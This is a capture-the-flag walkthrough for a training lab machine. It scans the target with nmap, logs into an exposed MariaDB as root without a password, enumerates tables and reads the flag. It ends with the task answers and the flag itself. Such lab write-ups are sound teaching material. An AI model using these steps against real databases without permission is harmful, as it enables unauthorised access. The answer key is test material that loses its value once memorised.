## Walkthrough

- nmap scans

```
┌─[birb@coffee]─[~]
└──╼ $nmap 10.129.172.2
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 22:13 IST
Nmap scan report for 10.129.172.2
Host is up (0.45s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 51.37 seconds
```

```
┌─[birb@coffee]─[~]
└──╼ $nmap 10.129.172.2 -sC -sV -p3306
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 22:19 IST
Nmap scan report for 10.129.172.2
Host is up (0.34s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 70
|   Capabilities flags: 63486
|   Some Capabilities: IgnoreSigpipes, Speaks41ProtocolNew, Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolOld, SupportsCompression, SupportsTransactions, InteractiveClient, IgnoreSpaceBeforeParenthesis, LongColumnFlag, FoundRows, ConnectWithDatabase, DontAllowDatabaseTableColumn, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: |qC::Pe-O&nz:Pe*@Bku
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 223.45 seconds
```

- connected to database using `mysql` command line utility

```
┌─[birb@coffee]─[~]
└──╼ $mysql -h 10.129.172.2 -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 84
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

- listed all the databases

```
MariaDB [(none)]> SHOW DATABASEs;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.297 sec)
```

- selected `htb` database (sounded sus)

```
MariaDB [(none)]> SHOW DATABASEs;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.297 sec)
```

- tables in `htb` database

```
MariaDB [htb]> SHOW TABLES;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.401 sec)
```

- found `flag` in table `config`

```
MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.588 sec)
```

- TIP : [visit me](https://dev.mysql.com/doc/mysql-getting-started/en/) to get started with mysql

## Tasks

**During our scan, which port do we find serving MySQL?**

=> 3306

**What community-developed MySQL version is the target running?**

=> MariaDB

**When using the MySQL command line client, what switch do we need to use in order to specify a login username?**

=> -u

**Which username allows us to log into this MariaDB instance without providing a password?**

=> root

**In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?**

=> *

**There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?**

=> htb

**Submit root flag**

=> 7b4bec00d1a39e3dd4e021ec3d915da8
